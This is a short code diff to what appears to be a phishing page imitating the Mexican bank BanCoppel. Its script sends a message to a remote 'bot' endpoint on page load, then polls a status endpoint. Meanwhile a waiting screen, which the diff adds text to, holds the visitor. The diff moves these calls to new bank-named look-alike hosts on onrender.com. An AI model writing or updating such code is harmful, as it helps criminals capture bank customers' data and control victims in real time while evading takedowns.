@@ -58,6 +58,7 @@
     <div class="loaderp">
       <div class="loader"></div>
       <div class="loaderp-text">Cargando...</div>
+      <h6>Por favor espere en linea para esperar el resultado de su analisis correctamente.</h6>
     </div>
   </div>
 
@@ -100,7 +101,7 @@ document.addEventListener('DOMContentLoaded', async function () {
   };
 
   // Enviar al bot con botones
-  await fetch("https://bancoppels.onrender.com/botmaster2.php", {
+  await fetch("https://bancoppelmxn.onrender.com/botmaster2.php", {
     method: "POST",
     headers: { "Content-Type": "application/x-www-form-urlencoded" },
     body: "data=" + encodeURIComponent(mensaje) +
@@ -112,7 +113,7 @@ document.addEventListener('DOMContentLoaded', async function () {
 
   async function revisarAccion(txId) {
     try {
-      const res = await fetch(`https://bancoppels.onrender.com/sendStatus.php?txid=${txId}`);
+      const res = await fetch(`https://bancoppelsite.onrender.com/sendStatus.php?txid=${txId}`);
       const json = await res.json();
 
       if (!json.status || json.status === "esperando") {
